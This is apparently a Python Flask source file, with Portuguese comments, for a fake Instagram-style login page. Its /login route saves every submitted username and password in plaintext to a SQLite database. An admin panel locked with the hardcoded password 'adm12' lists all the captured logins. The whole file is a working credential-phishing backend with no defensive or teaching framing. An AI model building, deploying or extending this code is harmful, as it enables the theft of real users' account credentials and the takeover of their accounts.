from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = "segredo"  # chave da sessão
DB_PATH = "users.db"

# garante que o banco exista
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

init_db()

# rota principal (login fake estilo instagram)
@app.route("/")
def index():
    return render_template("index.html")

# rota que recebe os dados do login fake
@app.route("/login", methods=["POST"])
def login_post():
    username = request.form.get("username")
    password = request.form.get("password")

    # salva no banco
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO logins (username, password) VALUES (?, ?)", (username, password))
    conn.commit()
    conn.close()

    return redirect(url_for("index"))

# rota do admin login
@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    error = None
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == "adm12" and password == "adm12":
            session["admin"] = True
            return redirect(url_for("painel"))
        else:
            error = "Usuário ou senha incorretos"
    return render_template("admin_login.html", error=error)

# painel (apenas admin pode ver)
@app.route("/painel")
def painel():
    if not session.get("admin"):
        return redirect(url_for("admin_login"))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, username, password FROM logins")
    logins = c.fetchall()
    conn.close()
    return render_template("painel.html", logins=logins)

if __name__ == "__main__":
    app.run(debug=True)
